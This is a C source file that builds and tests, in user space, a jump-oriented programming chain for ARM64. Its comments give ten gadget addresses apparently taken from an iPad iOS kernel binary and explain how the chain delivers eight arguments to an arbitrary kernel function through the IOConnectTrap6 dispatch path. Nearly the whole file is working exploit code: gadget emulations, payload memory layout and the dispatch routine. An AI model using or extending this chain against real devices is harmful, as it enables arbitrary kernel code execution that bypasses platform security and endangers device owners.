#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

// jop_claude.c - Delivers all 8 user arguments (x0..x7) cleanly to the target, using
// ONLY gadgets that actually exist in the kernel_ipad7_137 binary's code region.
//
// The call into the chain goes through the existing my_call6 helper (unchanged).
// Because my_call6 hardcodes the 8th C-call slot to 0, x7 enters prologue as 0;
// we recover x7 = x7_user inside the JOP chain itself via an extra "iter 5.5"
// that runs a real kernel gadget pair to overwrite x7 and bridge x0 back to
// the next data block. So my_call6 stays as-is, and x7_user still reaches the
// target.
//
// ABI NOTE: We deliberately AVOID writing the callee-saved registers x21..x28.
// In particular, x21 is used by the kernel-side caller of gadget_prologue in
// the IOConnectTrap6 dispatch path (it does `mov x0, x21 ; bl <fn>` right
// after returning from prologue), so corrupting x21 inside the JOP chain
// causes a kernel data abort on the next call. We use x20 instead because
// gadget_prologue itself preserves x20: its `stp x20, x19, [sp, #-0x20]!`
// and `ldp x20, x19, [sp], #0x20` save/restore x20 across the chain, so
// from the kernel caller's point of view x20 is preserved. We also use x11
// (caller-saved) for the target address instead of x9, but that change is
// just for symmetry with x20 - either caller-saved temp would work for the
// branch register.
//
// All 10 gadgets used (all in __PLK_TEXT_EXEC or __TEXT_EXEC, verified):
//   gadget_populate     0xFFFFFFF006019AFC   ldp x5,x8,[x0,#0x10] ; ldp x1,x2,[x0,#0x20] ; ldp x3,x4,[x0,#0x30] ; mov x0,x8 ; br x5
//   gadget_prologue     0xFFFFFFF006747A44   stp x20,x19,[sp,#-0x20]! ; ... ; blr x8 ; str x0,[x19] ; ... ; ret
//   mov_x10_x1__br_x2   0xFFFFFFF006628A94   mov x10, x1 ; br x2     (iter 1: x10 := populate;  iter 5: x10 := fixup)
//   mov_x20_x3__br_x2   0xFFFFFFF00659DCAC   mov x20, x3 ; br x2     (iter 2: x20 := x0_user)   <-- prologue restores x20
//   mov_x13_x1__br_x2   0xFFFFFFF006556E14   mov x13, x1 ; br x2     (iter 3: x13 := target_addr, intermediate)
//   mov_x11_x13__br_x10 0xFFFFFFF006512534   mov x11, x13 ; br x10   (iter 4: x11 := target_addr via x13)
//   mov_x7_x1__br_x8    0xFFFFFFF00654C500   mov x7,  x1  ; br x8    (iter 5.5: x7 := x7_user, then jump to bridge)
//   mov_x0_x3__br_x4    0xFFFFFFF00752BA84   mov x0,  x3  ; br x4    (iter 5.5 bridge: x0 := mem6, br populate)
//   mov_x5_x8__br_x10   0xFFFFFFF006B3D428   mov x5,  x8  ; br x10   (delivery: x5 := x5_user, br fixup)
//   mov_x0_x20__br_x11  0xFFFFFFF0072EEECC   mov x0,  x20 ; br x11   (delivery fixup: x0 := x0_user, br target)

void *my_page = NULL;

uint64_t func_arg8(uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8) {

    printf("a1 = 0x%llx, a2 = 0x%llx, a3 = 0x%llx, a4 = 0x%llx, a5 = 0x%llx, a6 = 0x%llx, a7 = 0x%llx, a8 = 0x%llx\n", \
        a1, a2, a3, a4, a5, a6, a7, a8);

    return 0xCAFEBABE41424344;
}

// 0xFFFFFFF006019AFC  (__PLK_TEXT_EXEC)
__attribute__((naked)) uint64_t gadget_populate(uint64_t *x0) {
    __asm__ volatile (
        "ldp X5, X8, [X0,#0x10] \n"
        "ldp X1, X2, [X0,#0x20] \n"
        "ldp X3, X4, [X0,#0x30] \n"
        "mov X0, X8 \n"
        "br X5 \n"
    );
}

// 0xFFFFFFF006747A44  (__PLK_TEXT_EXEC)
__attribute__((naked)) uint64_t gadget_prologue(uint64_t *x0) {
    __asm__ volatile (
        "stp x20, x19, [sp, #-0x20]!\n"
        "stp x29, x30, [sp, #0x10]\n"
        "add x29, sp, #0x10\n"
        "mov x19, x1\n"
        "ldr x0, [x0, #0x98]\n"
        "ldr x8, [x0]\n"
        "ldr x8, [x8, #0x7C0]\n"
        "blr x8\n"
        "str x0, [x19]\n"
        "mov w0, #0\n"
        "ldp x29, x30, [sp, #0x10]\n"
        "ldp x20, x19, [sp], #0x20\n"
        "ret\n"
    );
}

// 0xFFFFFFF006628A94  (__PLK_TEXT_EXEC)   mov x10, x1 ; br x2
__attribute__((naked)) void mov_x10_x1__br_x2(void) {
    __asm__ volatile (
        "mov x10, x1\n"
        "br x2\n"
    );
}

// 0xFFFFFFF00659DCAC  (__PLK_TEXT_EXEC)   mov x20, x3 ; br x2
__attribute__((naked)) void mov_x20_x3__br_x2(void) {
    __asm__ volatile (
        "mov x20, x3\n"
        "br x2\n"
    );
}

// 0xFFFFFFF006556E14  (__PLK_TEXT_EXEC)   mov x13, x1 ; br x2
__attribute__((naked)) void mov_x13_x1__br_x2(void) {
    __asm__ volatile (
        "mov x13, x1\n"
        "br x2\n"
    );
}

// 0xFFFFFFF006512534  (__PLK_TEXT_EXEC)   mov x11, x13 ; br x10
__attribute__((naked)) void mov_x11_x13__br_x10(void) {
    __asm__ volatile (
        "mov x11, x13\n"
        "br x10\n"
    );
}

// 0xFFFFFFF00654C500  (__PLK_TEXT_EXEC)   mov x7, x1 ; br x8
__attribute__((naked)) void mov_x7_x1__br_x8(void) {
    __asm__ volatile (
        "mov x7, x1\n"
        "br x8\n"
    );
}

// 0xFFFFFFF00752BA84  (__TEXT_EXEC)       mov x0, x3 ; br x4
__attribute__((naked)) void mov_x0_x3__br_x4(void) {
    __asm__ volatile (
        "mov x0, x3\n"
        "br x4\n"
    );
}

// 0xFFFFFFF006B3D428  (__PLK_TEXT_EXEC)   mov x5, x8 ; br x10
__attribute__((naked)) void mov_x5_x8__br_x10(void) {
    __asm__ volatile (
        "mov x5, x8\n"
        "br x10\n"
    );
}

// 0xFFFFFFF0072EEECC  (__TEXT_EXEC)       mov x0, x20 ; br x11
__attribute__((naked)) void mov_x0_x20__br_x11(void) {
    __asm__ volatile (
        "mov x0, x20\n"
        "br x11\n"
    );
}

int writebuf(uint64_t addr, const void* input, size_t size) {
    memcpy((void*)addr, input, size);
    return 0;
}

int write64(uint64_t a, uint64_t v) {
    return writebuf(a, &v, sizeof(v));
}

int write32(uint64_t a, uint32_t v) {
    return writebuf(a, &v, sizeof(v));
}

int readbuf(uint64_t addr, void* output, size_t size) {
    memcpy((void*)output, (void*)addr, size);

    return 0;
}

uint64_t read64(uint64_t a) {
    uint64_t value = 0;
    readbuf(a, &value, sizeof(value));
    return value;
}

uint32_t read32(uint64_t a) {
    uint32_t value = 0;
    readbuf(a, &value, sizeof(value));
    return value;
}

void hexdump(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        if ((i % 16) == 0)
        {
            printf("[0x%016llx+0x%03zx] ", (long long unsigned int)&data, i);
        }

        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        }
        else
            ascii[i % 16] = '.';

        if ((i + 1) % 8 == 0 || i + 1 == size) {
            printf(" ");
            if ((i + 1) % 16 == 0)
                printf("|  %s \n", ascii);
            else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i + 1) % 16; j < 16; ++j)
                    printf("   ");

                printf("|  %s \n", ascii);
            }
        }
    }
}


uint32_t my_call6(uint64_t addr, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7) {
    uint32_t ret = 0;

    uint64_t (*func)(uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t) =
        (uint64_t (*)(uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t)) addr;

    ret = (uint32_t)func(a1, a2, a3, a4, a5, a6, a7, 0);

    return ret;
}


// Chain flow (7 populate iterations total):
//
//   C ──my_call6──> prologue ──blr x8──> populate ──iter 1..6──> target
//   prologue's "blr x8" sets LR = address of "str x0,[x19]". The rest of the chain
//   uses only "br" (never "blr"), so LR is preserved. The target's "ret" lands back
//   at prologue's "str x0,[x19]", which saves x0 (the target's return value) into
//   STORED_RET, runs the normal epilogue, and ret's all the way out to my_call6.
//
//   ITER 1:   mov_x10_x1__br_x2     -> x10 := populate_addr   (br-x10 re-entry handle)
//   ITER 2:   mov_x20_x3__br_x2     -> x20 := x0_user         (prologue restores x20, so safe vs caller)
//   ITER 3:   mov_x13_x1__br_x2     -> x13 := target_addr     (intermediate for x11)
//   ITER 4:   mov_x11_x13__br_x10   -> x11 := target_addr     (caller-saved target reg)
//   ITER 5:   mov_x10_x1__br_x2     -> x10 := fixup_addr      (overwrites x10 for delivery)
//   ITER 5.5: mov_x7_x1__br_x8      -> x7  := x7_user, then br x8 = bridge gadget
//             mov_x0_x3__br_x4      -> x0  := mem6 (restore data-block ptr), br x4 = populate
//   ITER 6:   populate -> mov_x5_x8__br_x10 -> mov_x0_x20__br_x11 -> target
//
//   Iter 5.5 exists solely because my_call6 forces x7 = 0 at prologue entry.
//   The mov_x7_x1__br_x8 gadget reads x1 (= x7_user from the iter's data block)
//   and writes x7, but its branch target x8 == x0 == mem5_5[+0x18] (populate sets
//   both x0 and x8 from the same memory slot). So we set mem5_5[+0x18] to the
//   address of the mov_x0_x3__br_x4 bridge, which restores x0 to the delivery
//   data block (via x3, fed from mem5_5[+0x30]) and re-enters populate (via x4,
//   fed from mem5_5[+0x38]).
//
//   Register state at target entry:
//     x0..x5 = x0_user..x5_user
//     x6     = x6_user        (set by my_call6's a7 slot; preserved end-to-end)
//     x7     = x7_user        (set by iter 5.5; preserved through iter 6)
//
//   Registers NEVER written by the chain: x19, x21..x28 (callee-saved).
//   So when prologue returns, the kernel-side caller sees its callee-saved
//   register file intact.
//
// Payload memory layout (offsets relative to my_page):
//   Each per-iter data block uses only the offsets populate reads from:
//   0x10..0x38 (0x40 bytes total).

#define BLK1   0x000   // iter 1 data block (= my_page itself; prologue passes my_page as x0)
#define BLK2   0x100
#define BLK3   0x180
#define BLK4   0x200
#define BLK5   0x280
#define BLK5_5 0x300   // iter 5.5: stash x7 then bridge x0 back
#define BLK6   0x380   // delivery
#define STORED_RET_OFF 0x400

uint64_t call8_jop(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7) {
    uint64_t mp = (uint64_t)my_page;

    // Pointer-chase graph used by prologue (assuming its x0 input = my_page):
    //   ldr x0, [x0, #0x98]   -> *(my_page+0x98)  = my_page
    //   ldr x8, [x0]          -> *my_page         = my_page
    //   ldr x8, [x8, #0x7C0]  -> *(my_page+0x7C0) = gadget_populate
    //   blr x8                -> enters populate with x0 = my_page (= iter 1 data block)
    write64(mp + 0x00,  mp);
    write64(mp + 0x98,  mp);
    write64(mp + 0x7C0, (uint64_t)gadget_populate);

    // ----- ITER 1: x10 := populate_addr -----
    write64(mp + BLK1 + 0x10, (uint64_t)mov_x10_x1__br_x2);
    write64(mp + BLK1 + 0x18, mp + BLK2);                     // -> x8 -> x0 = mp+BLK2 (next block)
    write64(mp + BLK1 + 0x20, (uint64_t)gadget_populate);     // -> x1 (moved into x10)
    write64(mp + BLK1 + 0x28, (uint64_t)gadget_populate);     // -> x2 (br target)

    // ----- ITER 2: x20 := x0_user (using prologue-restored x20 instead of callee-saved x21) -----
    write64(mp + BLK2 + 0x10, (uint64_t)mov_x20_x3__br_x2);
    write64(mp + BLK2 + 0x18, mp + BLK3);                     // -> next block
    write64(mp + BLK2 + 0x28, (uint64_t)gadget_populate);     // -> x2 (br target)
    write64(mp + BLK2 + 0x30, x0);                            // -> x3 (moved into x20)

    // ----- ITER 3: x13 := target_addr (intermediate for x11) -----
    write64(mp + BLK3 + 0x10, (uint64_t)mov_x13_x1__br_x2);
    write64(mp + BLK3 + 0x18, mp + BLK4);                     // -> next block
    write64(mp + BLK3 + 0x20, addr);                          // -> x1 (moved into x13)
    write64(mp + BLK3 + 0x28, (uint64_t)gadget_populate);     // -> x2 (br target)

    // ----- ITER 4: x11 := x13 = target_addr (caller-saved target reg) -----
    write64(mp + BLK4 + 0x10, (uint64_t)mov_x11_x13__br_x10);
    write64(mp + BLK4 + 0x18, mp + BLK5);                     // -> next block

    // ----- ITER 5: x10 := fixup_addr (= mov_x0_x20__br_x11) -----
    write64(mp + BLK5 + 0x10, (uint64_t)mov_x10_x1__br_x2);
    write64(mp + BLK5 + 0x18, mp + BLK5_5);                   // -> next block (iter 5.5)
    write64(mp + BLK5 + 0x20, (uint64_t)mov_x0_x20__br_x11);  // -> x1 (moved into x10 = fixup)
    write64(mp + BLK5 + 0x28, (uint64_t)gadget_populate);     // -> x2 (br target)

    // ----- ITER 5.5: x7 := x7_user, then bridge x0 back to mem6 and re-enter populate -----
    //   populate sets up:
    //     x5 = mov_x7_x1__br_x8 addr
    //     x8 = x0 = mov_x0_x3__br_x4 addr (so "br x8" lands at the bridge gadget)
    //     x1 = x7_user
    //     x3 = mp + BLK6   (delivery data block; bridge will mov this into x0)
    //     x4 = populate    (bridge will br to it)
    //   mov x7, x1 ; br x8    -> x7 := x7_user, jump to mov_x0_x3__br_x4
    //   mov x0, x3 ; br x4    -> x0 := mp+BLK6, jump to populate
    write64(mp + BLK5_5 + 0x10, (uint64_t)mov_x7_x1__br_x8);
    write64(mp + BLK5_5 + 0x18, (uint64_t)mov_x0_x3__br_x4);  // -> x8 (br target of mov_x7); also -> x0 (will be overwritten by bridge)
    write64(mp + BLK5_5 + 0x20, x7);                          // -> x1 (moved into x7)
    write64(mp + BLK5_5 + 0x30, mp + BLK6);                   // -> x3 (bridge's source for x0)
    write64(mp + BLK5_5 + 0x38, (uint64_t)gadget_populate);   // -> x4 (bridge's br target)

    // ----- ITER 6 (DELIVERY): -----
    //   populate: x5 = mov_x5_x8__br_x10, x8 = x5_user, x1..x4 = user, x0 = x5_user (to be fixed up)
    //   br x5 -> mov x5,x8 : x5 := x5_user, br x10 (= fixup) -> mov x0,x20 : x0 := x0_user, br x11 (= target)
    write64(mp + BLK6 + 0x10, (uint64_t)mov_x5_x8__br_x10);
    write64(mp + BLK6 + 0x18, x5);                            // -> x8, then mov x0,x8 writes x0 (fixed up later)
    write64(mp + BLK6 + 0x20, x1);                            // -> x1
    write64(mp + BLK6 + 0x28, x2);                            // -> x2
    write64(mp + BLK6 + 0x30, x3);                            // -> x3
    write64(mp + BLK6 + 0x38, x4);                            // -> x4

    uint64_t STORED_RET = mp + STORED_RET_OFF;

    // Dispatch into prologue through the existing my_call6 helper (unchanged).
    // my_call6 ultimately performs:   func(a1, a2, a3, a4, a5, a6, a7, 0)
    // so the underlying C-ABI register loading is:
    //   x0 = a1 = mp
    //   x1 = a2 = STORED_RET
    //   x2..x5 = 0       (don't care - overwritten by populate)
    //   x6 = a7 = x6_user
    //   x7 = 0           (hardcoded by my_call6 - recovered to x7_user inside iter 5.5)
    // x10/x11/x13/x20/x7 are all stashed by the 7-iter chain above; no inline asm
    // on the C side, no modification of my_call6. x21..x28 are never touched.
    my_call6((uint64_t)gadget_prologue,
             mp,           // a1 -> x0
             STORED_RET,   // a2 -> x1
             0,            // a3 -> x2 (don't care)
             0,            // a4 -> x3 (don't care)
             0,            // a5 -> x4 (don't care)
             0,            // a6 -> x5 (don't care)
             x6);          // a7 -> x6
    (void)x7;              // consumed by the JOP chain via BLK5_5+0x20, not by my_call6

    return read64(STORED_RET);
}


int main(int argc, char *argv[], char *envp[]) {
#if 0
    printf("jop_practice\n");

    uint64_t ret = func_arg8(0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48);
    printf("func_arg8 ret = 0x%llx\n", ret);

    my_call6((uint64_t)func_arg8, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47);
#endif

    my_page = malloc(0x1000);
    memset(my_page, 0x0, 0x1000);
    printf("my_page = %p\n", my_page);


    uint64_t ret = call8_jop((uint64_t)func_arg8,
                             0xdeadbeef41424340, 0xdeadbeef41424341,
                             0xdeadbeef41424342, 0xdeadbeef41424343,
                             0xdeadbeef41424344, 0xdeadbeef41424345,
                             0xdeadbeef41424346, 0xdeadbeef41424347);
    printf("call8_jop ret = 0x%llx\n", ret);
    // Expected output (all 8 arguments delivered correctly):
    //   a1 = 0xdeadbeef41424340
    //   a2 = 0xdeadbeef41424341
    //   a3 = 0xdeadbeef41424342
    //   a4 = 0xdeadbeef41424343
    //   a5 = 0xdeadbeef41424344
    //   a6 = 0xdeadbeef41424345
    //   a7 = 0xdeadbeef41424346
    //   a8 = 0xdeadbeef41424347

    return 0;
}